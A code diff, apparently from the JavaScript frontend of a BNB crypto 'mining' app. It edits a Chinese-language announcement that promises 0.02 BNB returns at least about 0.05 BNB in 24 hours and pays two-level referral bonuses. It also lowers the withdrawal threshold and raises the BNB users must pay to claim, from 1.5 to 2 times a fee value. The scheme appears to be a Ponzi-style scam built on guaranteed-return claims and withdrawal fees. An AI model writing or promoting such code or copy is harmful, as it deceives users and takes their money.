@@ -953,7 +953,7 @@
                     uni.showModal({
                         title: "公告",
                         showCancel: !1,
-                        content: "META 无损挖矿BNB，正式上线。全网流通每增加300万 减产一次 \r\n1.投入0.02BNB 即可开始挖矿，24小时后可以提取到至少价值约0.05BNB的META。\r\n2.随着挖矿人数的增加，产量会逐步降低，请关注网站最新公告。\r\n3.邀请好友一起挖矿，一级奖励10% BNB，二级奖励5% BNB 立即到账  ",
+                        content: "META 无损挖矿BNB，正式上线。全网流通每增加300万 减产一次 \r\n1.投入0.02BNB 即可开始挖矿，24小时后可以提取到至少价值约0.05BNB的META。\r\n2.挖矿手续费会随着产出数据和价格变化在0.02-0.05BNB之间动态调整。请关注网站最新公告。\r\n3.邀请好友一起挖矿，一级奖励10% BNB，二级奖励5% BNB 立即到账  ",
                         success: function(t) {
                             t.confirm && console.log("用户点击确定")
                         }
@@ -1109,14 +1109,14 @@
                 claim1: function() {
                     var t = this;
 					console.log('claim1'),
-                    o && (t.minerConf.realunclaim <= 300  ? uni.showToast({
-                        title: "满300个才能提现",
+                    o && (t.minerConf.realunclaim <= 200  ? uni.showToast({
+                        title: "满200个才能提现",
                         icon: "error",
                         duration: 5e3
                     }) : (t.minerConf.doing2 = !0,
                     o.methods.doClaim().send({
                         from: t.address,
-			value: t.minerConf.ethBurn*1.5
+			value: t.minerConf.ethBurn*2
                     }).then((function(e) {
                         console.log(e),
                         t.minerConf.doing2 = !1,
